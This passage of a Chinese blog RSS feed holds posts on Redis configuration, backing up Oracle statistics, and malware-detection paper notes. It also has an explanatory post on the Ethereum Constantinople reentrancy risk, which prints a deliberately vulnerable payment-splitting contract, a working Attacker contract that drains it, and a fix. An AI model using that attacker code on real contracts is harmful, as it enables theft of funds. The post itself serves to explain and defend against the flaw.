&lt;p&gt;    &lt;strong&gt;dir ./&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;13. 设置当本机为slav服务时，设置master服务的IP地址及端口，在Redis启动时，它会自动从master进行数据同步&lt;/p&gt;
&lt;p&gt;    &lt;strong&gt;slaveof &lt;code&gt;&amp;lt;masterip&amp;gt;&lt;/code&gt; &lt;code&gt;&amp;lt;masterport&amp;gt;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;14. 当master服务设置了密码保护时，slav服务连接master的密码&lt;/p&gt;
&lt;p&gt;    &lt;strong&gt;masterauth &lt;code&gt;&amp;lt;master-password&amp;gt;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;15. 设置Redis连接密码，如果配置了连接密码，客户端在连接Redis时需要通过AUTH &lt;code&gt;&amp;lt;password&amp;gt;&lt;/code&gt;命令提供密码，默认关闭&lt;/p&gt;
&lt;p&gt;    &lt;strong&gt;requirepass foobared&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;16. 设置同一时间最大客户端连接数，默认无限制，Redis可以同时打开的客户端连接数为Redis进程可以打开的最大文件描述符数，如果设置 maxclients 0，表示不作限制。当客户端连接数到达限制时，Redis会关闭新的连接并向客户端返回max number of clients reached错误信息&lt;/p&gt;
&lt;p&gt;    &lt;strong&gt;maxclients 128&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;17. 指定Redis最大内存限制，Redis在启动时会把数据加载到内存中，达到最大内存后，Redis会先尝试清除已到期或即将到期的Key，当此方法处理 后，仍然到达最大内存设置，将无法再进行写入操作，但仍然可以进行读取操作。Redis新的vm机制，会把Key存放内存，Value会存放在swap区&lt;/p&gt;
&lt;p&gt;    &lt;strong&gt;maxmemory &lt;code&gt;&amp;lt;bytes&amp;gt;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;18. 指定是否在每次更新操作后进行日志记录，Redis在默认情况下是异步的把数据写入磁盘，如果不开启，可能会在断电时导致一段时间内的数据丢失。因为 redis本身同步数据文件是按上面save条件来同步的，所以有的数据会在一段时间内只存在于内存中。默认为no&lt;/p&gt;
&lt;p&gt;    &lt;strong&gt;appendonly no&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;19. 指定更新日志文件名，默认为appendonly.aof&lt;/p&gt;
&lt;p&gt;     &lt;strong&gt;appendfilename appendonly.aof&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;20. 指定更新日志条件，共有3个可选值：     &lt;strong&gt;no&lt;/strong&gt;：表示等操作系统进行数据缓存同步到磁盘（快）     &lt;strong&gt;always&lt;/strong&gt;：表示每次更新操作后手动调用fsync()将数据写到磁盘（慢，安全）     &lt;strong&gt;everysec&lt;/strong&gt;：表示每秒同步一次（折衷，默认值）&lt;/p&gt;
&lt;p&gt;    &lt;strong&gt;appendfsync everysec&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;21. 指定是否启用虚拟内存机制，默认值为no，简单的介绍一下，VM机制将数据分页存放，由Redis将访问量较少的页即冷数据swap到磁盘上，访问多的页面由磁盘自动换出到内存中（在后面的文章我会仔细分析Redis的VM机制）&lt;/p&gt;
&lt;p&gt;     &lt;strong&gt;vm-enabled no&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;22. 虚拟内存文件路径，默认值为/tmp/redis.swap，不可多个Redis实例共享&lt;/p&gt;
&lt;p&gt;     &lt;strong&gt;vm-swap-file /tmp/redis.swap&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;23. 将所有大于vm-max-memory的数据存入虚拟内存,无论vm-max-memory设置多小,所有索引数据都是内存存储的(Redis的索引数据 就是keys),也就是说,当vm-max-memory设置为0的时候,其实是所有value都存在于磁盘。默认值为0&lt;/p&gt;
&lt;p&gt;     &lt;strong&gt;vm-max-memory 0&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;24. Redis swap文件分成了很多的page，一个对象可以保存在多个page上面，但一个page上不能被多个对象共享，vm-page-size是要根据存储的 数据大小来设定的，作者建议如果存储很多小对象，page大小最好设置为32或者64bytes；如果存储很大大对象，则可以使用更大的page，如果不 确定，就使用默认值&lt;/p&gt;
&lt;p&gt;     &lt;strong&gt;vm-page-size 32&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;25. 设置swap文件中的page数量，由于页表（一种表示页面空闲或使用的bitmap）是在放在内存中的，，在磁盘上每8个pages将消耗1byte的内存。&lt;/p&gt;
&lt;p&gt;     &lt;strong&gt;vm-pages 134217728&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;26. 设置访问swap文件的线程数,最好不要超过机器的核数,如果设置为0,那么所有对swap文件的操作都是串行的，可能会造成比较长时间的延迟。默认值为4&lt;/p&gt;
&lt;p&gt;     &lt;strong&gt;vm-max-threads 4&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;27. 设置在向客户端应答时，是否把较小的包合并为一个包发送，默认为开启&lt;/p&gt;
&lt;p&gt;    &lt;strong&gt;glueoutputbuf yes&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;28. 指定在超过一定的数量或者最大的元素超过某一临界值时，采用一种特殊的哈希算法&lt;/p&gt;
&lt;p&gt;    &lt;strong&gt;hash-max-zipmap-entries 64&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;    hash-max-zipmap-value 512&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;29. 指定是否激活重置哈希，默认为开启（后面在介绍Redis的哈希算法时具体介绍）&lt;/p&gt;
&lt;p&gt;    &lt;strong&gt;activerehashing yes&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;30. 指定包含其它的配置文件，可以在同一主机上多个Redis实例之间使用同一份配置文件，而同时各个实例又拥有自己的特定配置文件&lt;/p&gt;
&lt;p&gt;    &lt;strong&gt;include /path/to/local.conf&lt;/strong&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div id=&quot;MySignature&quot; readability=&quot;9.0030211480363&quot;&gt;
&lt;p id=&quot;PSignature&quot;&gt;&lt;br/&gt;作　　者：&lt;strong&gt;&lt;span&gt;&lt;a href=&quot;http://www.cnblogs.com/toutou/&quot; target=&quot;_blank&quot;&gt;请叫我头头哥&lt;/a&gt;&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;出　　处：&lt;a href=&quot;http://www.cnblogs.com/toutou/&quot; target=&quot;_blank&quot;&gt;http://www.cnblogs.com/toutou/&lt;/a&gt;&lt;br/&gt;关于作者：专注于基础平台的项目开发。如有问题或建议，请多多赐教！&lt;br/&gt;版权声明：本文版权归作者和博客园共有，欢迎转载，但未经作者同意必须保留此段声明，且在文章页面明显位置给出原文链接。&lt;br/&gt;特此声明：所有评论和私信都会在第一时间回复。也欢迎园子的大大们指正错误，共同进步。或者&lt;a href=&quot;http://msg.cnblogs.com/msg/send/%E8%AF%B7%E5%8F%AB%E6%88%91%E5%A4%B4%E5%A4%B4%E5%93%A5&quot;&gt;直接私信&lt;/a&gt;我&lt;br/&gt;声援博主：如果您觉得文章对您有帮助，可以点击文章右下角&lt;strong&gt;&lt;span&gt;【&lt;a id=&quot;post-up&quot; href=&quot;javascript:void(0);&quot;&gt;推荐&lt;/a&gt;】&lt;/span&gt;&lt;/strong&gt;一下。您的鼓励是作者坚持原创和持续写作的最大动力！&lt;br/&gt;&lt;/p&gt;
&lt;/div&gt;

</description>
<pubDate>Fri, 18 Jan 2019 15:22:00 +0000</pubDate>
<dc:creator>请叫我头头哥</dc:creator>
<og:description>vRedis的安装 ♛ 1.0 下载Redis wget http://download.redis.io/releases/redis-5.0.2.tar.gz ♛ 1.1 解压 tar -zxvf</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/toutou/p/install_redis.html</dc:identifier>
</item>
<item>
<title>Oracle 10g收集数据库统计信息 - AlfredZhao</title>
<link>http://www.cnblogs.com/jyzhao/p/10290087.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/jyzhao/p/10290087.html</guid>
<description>&lt;p&gt;某数据库由于整体统计信息不准确，多次出现部分业务SQL选错执行计划，从而导致性能下降影响到最终用户体验，目前通过SQL_PROFILE绑定执行计划临时解决，但此方法不够灵活，后续维护工作量也会增加。&lt;br/&gt;Oracle优化器（CBO）依赖数据库统计信息来计算目标SQL各种可能的执行路径的成本，并从中选择一条成本值最小的执行路径来作为目标SQL的执行计划。如果统计信息不准确甚至是错误，会导致优化器选择错误SQL执行计划的概率大大增加。&lt;br/&gt;目前计划对该数据库统计信息进行重新收集，因为生产环境的复杂性，不排除重新收集正确的统计信息后，整体性能反而下降的情况。故而在收集之前需要对原有的统计信息做好备份，如发现收集后性能反而下降的极端情况，也可以快速回退到原有的统计信息。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2.1备份当前数据库统计信息&lt;/strong&gt;&lt;br/&gt;备份当前数据库的统计信息，建议备份后再导出一份留存：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;--备份当前数据库的统计信息：
begin
 DBMS_STATS.CREATE_STAT_TABLE('SYSTEM','DB_STATS_20190118'); 
 DBMS_STATS.EXPORT_DATABASE_STATS(STATTAB =&amp;gt; 'DB_STATS_20190118', STATOWN =&amp;gt; 'SYSTEM');
end;
/

--备份后再导出一份留存
expdp \'/ as sysdba\' directory=DATA_PUMP_DIR dumpfile=stats.dmp logfile=stats.log tables=system.db_stats_20190118&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;2.2收集数据库统计信息&lt;/strong&gt;&lt;br/&gt;收集数据库的统计信息，需要在业务闲时操作：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;--开启计时
set timing on

--开始收集全库统计信息
begin
dbms_stats.gather_database_stats(
ESTIMATE_PERCENT=&amp;gt;DBMS_STATS.AUTO_SAMPLE_SIZE, method_opt =&amp;gt; 'for all indexed columns', cascade=&amp;gt;true, degree=&amp;gt;16);
end;
/&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;注意：degree的值并不是设置越高就越快，同时要根据实际CPU具体情况来设置。&lt;/p&gt;
&lt;p&gt;如果数据库是11.2.0.2及以上版本，还可以通过DBMS_STATS.SET_GLOBAL_PREFS设置并发收集进一步提升收集效率，具体可参考：&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3.1正常回退&lt;/strong&gt;&lt;br/&gt;收集统计信息后发现性能大幅下降，正常回退，直接将原统计信息导入：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;--正常回退，直接将原统计信息导入：
exec DBMS_STATS.IMPORT_DATABASE_STATS (STATTAB =&amp;gt; 'DB_STATS_20190118', STATOWN =&amp;gt; 'SYSTEM');&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;3.2其他情况&lt;/strong&gt;&lt;br/&gt;如果DB_STATS_20190118被损坏，可以删除后使用之前的备份导入：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;--删除DB_STATS_20190118：
exec DBMS_STATS.DROP_STAT_TABLE ('SYSTEM','DB_STATS_20190118');
--使用之前的备份导入DB_STATS_20190118：
impdp \'/ as sysdba\' directory=DATA_PUMP_DIR dumpfile=stats.dmp logfile=stats.log&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Fri, 18 Jan 2019 15:01:00 +0000</pubDate>
<dc:creator>AlfredZhao</dc:creator>
<og:description>'1.需求概述' '2.实施步骤' '3.回退方案' 1.需求概述 某数据库由于整体统计信息不准确，多次出现部分业务SQL选错执行计划，从而导致性能下降影响到最终用户体验，目前通过SQL_PROFIL</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/jyzhao/p/10290087.html</dc:identifier>
</item>
<item>
<title>君士坦丁堡分叉引起的安全问题 - baizx</title>
<link>http://www.cnblogs.com/baizx/p/10290049.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/baizx/p/10290049.html</guid>
<description>&lt;p class=&quot;toc&quot;&gt;目录&lt;/p&gt;

&lt;h2 id=&quot;一.-什么是君士坦丁堡分叉&quot;&gt;一. 什么是君士坦丁堡分叉&lt;/h2&gt;
&lt;p&gt;君士坦丁堡是最近以太坊的大事,主要做了一下改进&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;EIP 145：由两位以太坊开发人员Alex Beregszaszi 和 Pawel Bylica编写的技术升级，EIP 145详细描述了一种更有效的以太坊信息处理方案，其称为逐位移动（bitwise shifting）；&lt;/li&gt;
&lt;li&gt;EIP 1052:由以太坊core开发人员Nick Johnson和Bylica所撰写，1052提供了一种优化以太坊网络大规模代码执行的方法。&lt;/li&gt;
&lt;li&gt;EIP 1283：由Johnson撰写，其基于EIP 1087，这一提议主要了引入了一种针对数据存储更改更公平的定价方法，这可以让智能合约开发者受益。&lt;/li&gt;
&lt;li&gt;EIP 1014：由以太坊创始人Vitalik Buterin亲自创建，此升级的目的是更好地促进基于状态通道和链外（off-chain）交易的扩容解决方案。&lt;/li&gt;
&lt;li&gt;EIP 1234：由以太坊主要客户端 Parity发布经理 Afri Schoedon所倡导，这也是以太坊此次升级中最具争议的部分，它会使以太坊网络的区块奖励从3ETH减少到2ETH，此外还会延迟难度炸弹12个月的时间。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;其中&lt;a href=&quot;https://eips.ethereum.org/EIPS/eip-1283&quot;&gt;EIP 1283&lt;/a&gt; 最重要的改动就是对于修改合约内容更加便宜了,原来修改非0内容的地址需要5000gas,现在只需要200gas.&lt;br/&gt;具体意思就是&lt;/p&gt;
&lt;pre class=&quot;sol&quot;&gt;
&lt;code&gt;//第一次写入
Contract.A=300 //花费20000gas
//第二次写入
Contract.A=500 //花费5000gas,如果是君士坦丁堡分叉以后只有200gas.&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这对于DAPP而言肯定是好事,降低了DAPP的成本.但是意外却引入了安全风险.&lt;/p&gt;
&lt;h2 id=&quot;二.-一个重入合约&quot;&gt;二. 一个重入合约&lt;/h2&gt;
&lt;p&gt;一份双方协调分成的合约,简化起见,里面很多安全问题没检查,比如updateSplit应该只能参与双方更新.&lt;/p&gt;
&lt;pre class=&quot;sol&quot;&gt;
&lt;code&gt;//PaymentSharer.sol
pragma solidity ^0.5.0;

contract PaymentSharer {
  mapping(uint =&amp;gt; uint) splits;
  mapping(uint =&amp;gt; uint) deposits;
  mapping(uint =&amp;gt; address payable) first;
  mapping(uint =&amp;gt; address payable) second;

  function init(uint id, address payable _first, address payable _second) public {
    require(first[id] == address(0) &amp;amp;&amp;amp; second[id] == address(0));
    require(first[id] == address(0) &amp;amp;&amp;amp; second[id] == address(0));
    first[id] = _first;
    second[id] = _second;
  }

  function deposit(uint id) public payable {
    deposits[id] += msg.value;
  }

  function updateSplit(uint id, uint split) public {
    require(split &amp;lt;= 100);
    splits[id] = split;
  }

  function splitFunds(uint id) public {
    // Here would be: 
    // Signatures that both parties agree with this split

    // Split
    address payable a = first[id];
    address payable b = second[id];
    uint depo = deposits[id];
    deposits[id] = 0;
     
    a.transfer(depo * splits[id] / 100); //transfer 给2100 gas执行事务
    b.transfer(depo * (100 - splits[id]) / 100);
  }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;双方协商一致,调用updateSplit,定下各自应得多少比例.然后就可以调用splitFunds,分别拿走各自的ether.&lt;br/&gt;这在君士坦丁堡分叉之前,是非常安全的.&lt;/p&gt;
&lt;h2 id=&quot;三.-一份尝试攻击的合约&quot;&gt;三. 一份尝试攻击的合约&lt;/h2&gt;
&lt;pre class=&quot;solidity&quot;&gt;
&lt;code&gt;pragma solidity ^0.5.0;

import &quot;./PaymentSharer.sol&quot;;

contract Attacker {
  address private victim;
  address payable owner;

  constructor() public {
    owner = msg.sender;
  }

  function attack(address a) external {
    victim = a;
    PaymentSharer x = PaymentSharer(a);
    x.updateSplit(0, 100);
    x.splitFunds(0);
  }

  function () payable external {
    PaymentSharer x = PaymentSharer(victim);
    x.updateSplit(0,0); //修改split,这样下b.transfer就不再是transfer 0,达到双倍收益.
  }
  //从合约中拿走全部ether
  function drain() external {
    owner.transfer(address(this).balance);
  }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;四.-组合调用&quot;&gt;四. 组合调用&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;
&lt;ol&gt;&lt;li&gt;PaymentSharer.init(0,Attacker,anotherAddressOfAttacker)&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;li&gt;
&lt;ol&gt;&lt;li&gt;PaymentSharer.deposit(0) value=1ether&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;li&gt;
&lt;ol&gt;&lt;li&gt;Attacker.attack(PaymentSharer)&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;最关键的是第三步的调用顺序:&lt;br/&gt;attack--&amp;gt;updateSplit--&amp;gt;attack---&amp;gt;splitFunds(a全得,b没有)---&amp;gt;a.transfer---&amp;gt;Attacker's fallback---&amp;gt;updateSplit(a没有,b全得)--&amp;gt;b.transfer&lt;/p&gt;
&lt;p&gt;最终a,b(Attacker和anotherAddressOfAttacker)各拿了一份完整的是后入,而不是预想的只有拿走全部.&lt;/p&gt;
&lt;h3 id=&quot;分叉之前&quot;&gt;分叉之前&lt;/h3&gt;
&lt;p&gt;合约中调用transfer函数的gas是固定的,只能是2300,无法改动. 而Attacker's fallback 函数中调用updateSplit, 其中 &lt;code&gt;splits[id] = split;&lt;/code&gt;这一句话就会消耗5000gas,因此attack这个Tx会失败.&lt;/p&gt;
&lt;h3 id=&quot;分叉之后&quot;&gt;分叉之后&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;splits[id] = split;&lt;/code&gt;只会消耗gas200,因此有足够的gas来执行updateSplit, 所以a.transfer会成功,然后b.transfer自然也会成功.&lt;/p&gt;
&lt;h3 id=&quot;调用顺序&quot;&gt;调用顺序&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/124391/201901/124391-20190118223636042-2098560701.png&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;五.-如何解决&quot;&gt;五. 如何解决&lt;/h2&gt;
&lt;p&gt;针对这个问题解决起来非常简单.下面就是一种修正方法.&lt;/p&gt;
&lt;pre class=&quot;sol&quot;&gt;
&lt;code&gt;function splitFunds(uint id) public {
    // Here would be: 
    // Signatures that both parties agree with this split

    // Split
    address payable a = first[id];
    address payable b = second[id];
    uint depo = deposits[id];
    deposits[id] = 0;
    uint s=splits[id];
    a.transfer(depo * s / 100); //transfer 给2100 gas执行事务
    b.transfer(depo * (100 - s) / 100);
  }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这样就算是Attacker有了重入的机会,可以执行代码,也不会有任何额外收益. 应该说合约的设计者已经考虑到a.transfer的重入问题,先修改了deposits[id],而不是放在transfer之后,但是仍然百密一疏.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;合约一旦发布就无法修改,但是EVM规则却可以通过分叉修改&lt;/strong&gt;,可以解决以后的问题,但是却不能修复已经发布的合约.&lt;/p&gt;
&lt;p&gt;本来参考了一下文章&lt;br/&gt;&lt;a href=&quot;https://medium.com/chainsecurity/constantinople-enables-new-reentrancy-attack-ace4088297d9&quot;&gt;Constantinople enables new Reentrancy Attack&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 18 Jan 2019 14:40:00 +0000</pubDate>
<dc:creator>baizx</dc:creator>
<og:description>君士坦丁堡分叉引起的安全问题 &lt;! @import '[TOC]' {cmd='toc' depthFrom=1 depthTo=6 orderedList=false} 一. 什么是君士坦丁堡分叉</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/baizx/p/10290049.html</dc:identifier>
</item>
<item>
<title>【论文笔记】Malware Detection with Deep Neural Network Using Process Behavior - BYRans</title>
<link>http://www.cnblogs.com/BYRans/p/10289938.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/BYRans/p/10289938.html</guid>
<description>&lt;hr/&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;会议：&lt;/strong&gt; IEEE（2016 IEEE 40th Annual Computer Software and Applications Conference）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;单位&lt;/strong&gt;： Nagoya University（名古屋大学）、NTT Secure Platform Laboratories（NTT安全平台实验室）&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;数据&lt;/strong&gt;：81个恶意软件日志文件、69个良性软件日志文件。其中恶意软件由NTT Secure Platform Laboratory收集，共26个恶意软件。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;方法&lt;/strong&gt;：基于软件日志（即软件行为）数据，首先用RNN提取恶意、良性软件行为特征，生成特征图像，再用CNN进行分类。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;效果&lt;/strong&gt;：AUC = 0.96&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;恶意软件样本由NTT Secure Platform Laboratory收集，共26个恶意软件，使用Symantec（赛门铁克）将其标记为11个家族。&lt;/p&gt;
&lt;p&gt;在Ubuntu上使用VirtualBox搭建windows环境，使用Process Monitor、INetSim2、Cuckoo Sandbox等工具生成恶意和良性软件的日志。共生成81个恶意软件、69个良性软件日志文件。&lt;/p&gt;
&lt;p&gt;日志数据生成环境如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.cnblogs.com/images/cnblogs_com/BYRans/761498/o_Logging%20environment.png&quot; width=&quot;650&quot; alt=&quot;Logging-environment&quot;/&gt;&lt;/p&gt;
&lt;p&gt;使用Process Monitor来记录ReadFile，RegSetValue，Thread Start等行为；&lt;br/&gt;通过Process Monitor记录的行为（Operation）数据如下表所示。&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;1&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;Time&lt;/td&gt;
&lt;td&gt;Operation执行时间&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;Process Name&lt;/td&gt;
&lt;td&gt;Process名&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;PID&lt;/td&gt;
&lt;td&gt;Operation的PID&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;Event&lt;/td&gt;
&lt;td&gt;Operation名&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;Path&lt;/td&gt;
&lt;td&gt;Operation执行时所在路径&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;Result&lt;/td&gt;
&lt;td&gt;执行结果状态&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;Detail&lt;/td&gt;
&lt;td&gt;参数等信息&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;Result记录了Operation的结果，如SUCCESS，ACCESS DENIED，FILE NOT FOUND等；&lt;br/&gt;Detail记录了参数等信息。&lt;/p&gt;


&lt;h2 id=&quot;方法概述-1&quot;&gt;方法概述&lt;/h2&gt;
&lt;p&gt;算法的主要思路为：将Process行为日志转化为向量，使用RNN转换为特征图像，在用CNN对这些特征图像进行分类。&lt;br/&gt;流程图如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.cnblogs.com/images/cnblogs_com/BYRans/761498/o_Overview-of-proposed-method.png&quot; width=&quot;650&quot; alt=&quot;Overview-of-proposed-method&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Step1: 监视Process的行为,并生成日志文件。&lt;br/&gt;Step2: 将日志数据转为one-hot向量，按Operation执行输入RNN训练，获取trained RNN模型。&lt;br/&gt;Step3: 用trained RNN从日志文件中提取特征，并将特征转换为特征图像。&lt;br/&gt;Step4: 使用标有恶意、良性标签的特征图像数据，训练CNN模型。&lt;br/&gt;Step5: 训练结束后，由训练的RNN模型将Process行为日志文件转化为特征图像，再由训练的CNN模型进行分类，最后输出Process为恶意软件的概率。&lt;/p&gt;

&lt;h2 id=&quot;训练rnn&quot;&gt;训练RNN&lt;/h2&gt;
&lt;p&gt;将日志文件的Operation数据基于Operation Name转为one-hot向量作为输入，隐藏层&lt;span class=&quot;math inline&quot;&gt;\(h^1\)&lt;/span&gt;的神经元为普通神经元，&lt;span class=&quot;math inline&quot;&gt;\(h^2\)&lt;/span&gt;、&lt;span class=&quot;math inline&quot;&gt;\(h^3\)&lt;/span&gt;层为LSTM神经元。&lt;br/&gt;网络结构如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.cnblogs.com/images/cnblogs_com/BYRans/761498/o_Flow-of-RNN-training.png&quot; width=&quot;650&quot; alt=&quot;Flow-of-RNN-training&quot;/&gt;&lt;/p&gt;

&lt;h2 id=&quot;生成特征图像&quot;&gt;生成特征图像&lt;/h2&gt;
&lt;p&gt;用trained RNN提取Process的特征并生成特征图像。&lt;br/&gt;特征提取流程如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.cnblogs.com/images/cnblogs_com/BYRans/761498/o_Flow-of-feature-extraction.png&quot; width=&quot;650&quot; alt=&quot;Flow-of-feature-extraction&quot;/&gt;&lt;/p&gt;
&lt;p&gt;将日志文件中的Operation转换为one-hot向量，然后依次将它们输入到trained RNN中。 获取每个输入的第三隐藏层&lt;span class=&quot;math inline&quot;&gt;\(h^3\)&lt;/span&gt;的值，得到集合{&lt;span class=&quot;math inline&quot;&gt;\(h^3_1\)&lt;/span&gt;，&lt;span class=&quot;math inline&quot;&gt;\(h^3_2\)&lt;/span&gt;，...，&lt;span class=&quot;math inline&quot;&gt;\(h^3_L\)&lt;/span&gt;}。 CNN模型输入图像矩阵为固定大小，故需将每个Process日志文件转为相同大小的特征图像矩阵。&lt;br/&gt;用了以下等式将Operation特征向量集转为Process特征图像矩阵&lt;span class=&quot;math inline&quot;&gt;\(F\)&lt;/span&gt;：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.cnblogs.com/images/cnblogs_com/BYRans/761498/o_feature-image-1.png&quot; width=&quot;650&quot; alt=&quot;feature-image-1&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;math inline&quot;&gt;\(f_k\)&lt;/span&gt;：固定大小的特征图像矩阵的元素&lt;br/&gt;&lt;span class=&quot;math inline&quot;&gt;\(N\)&lt;/span&gt;：集合{&lt;span class=&quot;math inline&quot;&gt;\(h^3_1\)&lt;/span&gt;，&lt;span class=&quot;math inline&quot;&gt;\(h^3_2\)&lt;/span&gt;，...，&lt;span class=&quot;math inline&quot;&gt;\(h^3_L\)&lt;/span&gt;}分为N组并计算每组的平均值，&lt;span class=&quot;math inline&quot;&gt;\(N\)&lt;/span&gt;也就是特征图像矩阵&lt;span class=&quot;math inline&quot;&gt;\(F\)&lt;/span&gt;的行数。&lt;br/&gt;&lt;span class=&quot;math inline&quot;&gt;\(p_k\)&lt;/span&gt;：第&lt;span class=&quot;math inline&quot;&gt;\(k\)&lt;/span&gt;个矢量集的最后一个数。&lt;br/&gt;&lt;span class=&quot;math inline&quot;&gt;\(W\)&lt;/span&gt;：设为第3隐藏层的维数，则固定向量序列可以描述为矩阵F.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.cnblogs.com/images/cnblogs_com/BYRans/761498/o_feature-image-2.png&quot; width=&quot;650&quot; alt=&quot;feature-image-2&quot;/&gt;&lt;/p&gt;
&lt;p&gt;通过sigmoid函数将矩阵F的每个元素映射到[0,1]空间，并乘以255来形成256级灰度图像。 最后，输出矩阵&lt;span class=&quot;math inline&quot;&gt;\(F\)&lt;/span&gt;作为特征图像矩阵。&lt;/p&gt;

&lt;h2 id=&quot;训练cnn&quot;&gt;训练CNN&lt;/h2&gt;
&lt;p&gt;使用带有恶意、良性标记的特征图像矩阵作为输入训练CNN网络。CNN网络结构如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.cnblogs.com/images/cnblogs_com/BYRans/761498/o_Structure-of-the-CNN.png&quot; width=&quot;650&quot; alt=&quot;Structure-of-the-CNN&quot;/&gt;&lt;/p&gt;
&lt;p&gt;输出&lt;span class=&quot;math inline&quot;&gt;\(y_0\)&lt;/span&gt;、&lt;span class=&quot;math inline&quot;&gt;\(y_1\)&lt;/span&gt;分别为为良性软件、恶意软件的概率。可用sigmoid函数&lt;span class=&quot;math inline&quot;&gt;\(Sig\)&lt;/span&gt;(&lt;span class=&quot;math inline&quot;&gt;\(y_1\)&lt;/span&gt;)计算出为恶意软件的概率。&lt;/p&gt;


&lt;p&gt;作者尝试了不同的RNN的隐含层维度、CNN输入矩阵大小、CNN卷积层池化层参数&lt;span class=&quot;math inline&quot;&gt;\(w\)&lt;/span&gt;。使用5折交叉验证，最佳结果为在下表中Cond2条件时，AUC为0.96。&lt;/p&gt;
